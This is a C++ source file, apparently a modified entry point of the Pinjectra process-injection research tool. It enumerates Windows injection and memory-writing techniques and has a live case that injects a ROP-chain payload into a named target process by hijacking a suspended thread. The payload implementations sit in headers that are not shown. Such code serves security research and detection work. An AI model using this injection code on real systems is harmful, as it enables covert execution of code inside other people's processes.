// Copyright (c) 2019, SafeBreach
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
//  * Redistributions of source code must retain the above copyright notice,
//    this list of conditions and the following disclaimer.
//  * Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
//  * Neither the name of the copyright holder nor the names of its
//    contributors may be used to endorse or promote products derived from
//    this software without specific prior written permission.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.

// AUTHORS: Amit Klein, Itzik Kotler
// SEE: https://github.com/SafeBreach-Labs/Pinjectra

#include <iostream>
#include <codecvt>
std::wstring stringToWstring(const std::string& t_str)
{
	//setup converter
	typedef std::codecvt_utf8<wchar_t> convert_type;
	std::wstring_convert<convert_type, wchar_t> converter;

	//use converter (.to_bytes: wstr->str, .from_bytes: str->wstr)
	return converter.from_bytes(t_str);
}

// Injection Techniques
#include "WindowsHook.h"
#include "CreateRemoteThread.h"
#include "SIR.h"
#include "QueueUserAPC.h"
#include "CtrlInject.h"
#include "ALPC.h"
#include "PROPagate.h"
#include "SetWindowLongPtrA.h"

// Writing Techniques
#include "LLA_GPA.h"
#include "OP_VAE_WPM.h"
#include "CFMA_MVOF_OP_PNMVOS.h"
#include "OT_OP_VAE_GAAA.h"
#include "VAE_WPM.h"
#include "NQAT_WITH_MEMSET.h"
#include "GhostWriting.h"
#include "CFMA_MVOF_NUVOS_NMVOS.h"

// Providers (Other)
#include "HookProcProvider.h"

// Payloads
extern "C" {
	#include "StaticPayloads.h"
}

#include "DynamicPayloads.h"


  /////////////////////////////////////////
 //  Helper Functions to Look Up Stuff  //
/////////////////////////////////////////
#include "helper.h"
#include "threadhelper.h"

///////////////
// Functions //
///////////////

void usage(char *progname)
{
	std::cout << "usage: " << progname << " <DEMO ID> <processname> [DLL Path to inject]" << std::endl << std::endl <<
		"Explanation:" << std::endl <<
		"------------" << std::endl <<
		"Injects a DLL using LoadLibraryA in the first wait-state thread in <processname>" << std::endl <<
		"DEMOS:" << std::endl <<
		"------" << std::endl << std::endl <<
		//"#1: (WindowsHook) " << std::endl << "\t+ LoadLibraryA_GetProcAddress(\"MsgBoxOnGetMsgProc.dll\", \"GetMsgProc\")" << std::endl << std::endl <<
		//"#2: (CreateRemoteThread) " << std::endl << "\t+ OpenProcess_VirtualAllocEx_WriteProcessMemory(\"MsgBoxOnProcessAttach.dll\") [Entry: LoadLibraryA]" << std::endl << std::endl <<
		//"#3: (CreateRemoteThread) " << std::endl << "\t+ CreateFileMappingA_MapViewOfFile_OpenProcess_PNtMapViewOfSection(Static PAYLOAD2)" << std::endl << std::endl <<
		//"#4: (SuspendThread/SetThreadContext/ResumeThread) " << std::endl << "\t+ OpenProcess_VirtualAllocEx_WriteProcessMemory(Static PAYLOAD1)" << std::endl << std::endl <<
		//"#5: (QueueUserAPC) " << std::endl << "\t+ OpenThread_OpenProcess_VirtualAllocEx_GlobalAddAtomA(Static PAYLOAD2)" << std::endl << std::endl <<
		//"#6: (CtrlInject) " << std::endl << "\t+ OpenProcess_VirtualAllocEx_WriteProcessMemory(Static PAYLOAD2)" << std::endl << std::endl <<
		//"#7: (ALPC)**" << std::endl << "\t+ VirtualAllocEx_WriteProcessMemory(Static PAYLOAD3) [Try on EXPLORER.EXE PID]" << std::endl << std::endl <<
		//"#8: (PROPagate) " << std::endl << "\t+ VirtualAllocEx_WriteProcessMemory(Static PAYLOAD2)" << std::endl << std::endl <<
		"#9: (SuspendThread/ResumeThread)* " << std::endl << "\t+ NtQueueApcThread with memset(Dyanmic ROP_CHAIN_1)" << std::endl << std::endl <<
		//"#10: (SetWindowLongPtrA) " << std::endl << "\t+ VirtualAllocEx_WriteProcessMemory(Dyanmic PAYLOAD4)" << std::endl << std::endl <<
		"#11: (SuspendThread/ResumeThread)* " << std::endl << "\t+ GhostWriting(Dyanmic ROP_CHAIN_2)" << std::endl << std::endl <<
		//"#12: (ProcessSuspendInjectAndResume) " << std::endl << "\t+ CreateFileMappingA_MapViewOfFile_NtUnmapViewOfSection_NtMapViewOfSection(Dyanmic PAYLOAD5) [Try on EXPLORER.EXE PID]" << std::endl << std::endl <<
		"* - Requires Target Thread to be in Alertable State" << std::endl <<
		"** - Requires Target to use ALPC Port" << std::endl;

	return ;
}

/////////////////
// Entry Point //
/////////////////

int main(int argc, char* argv[])
{
	DWORD pid, tid, demo_id;

	ExecutionTechnique* executor;

	if (argc < 2)
	{
		usage(argv[0]);
		return 0;
	}

	printf("Current PID: %d\n", GetCurrentProcessId());

	// we change the usage sig to be ./pinjectra.exe [technique] [processname]
	demo_id = atoi(argv[1]);
	std::wstring processName = stringToWstring(argv[2]);

	pid = getPID(processName);
	//std::vector<DWORD64> tids = EnumThreads(processName);

	tid = segment::GetSuspendedThreadID(processName);

	//tid = (DWORD)tids[0];

	switch (demo_id)
	{
		// StackBomber
	case 9:
		executor = new CodeViaThreadSuspendInjectAndResume_Complex(
			new NtQueueApcThread_WITH_memset(
				new _ROP_CHAIN_1()
			)
		);
		executor->inject(pid, tid);
		break;
	}
}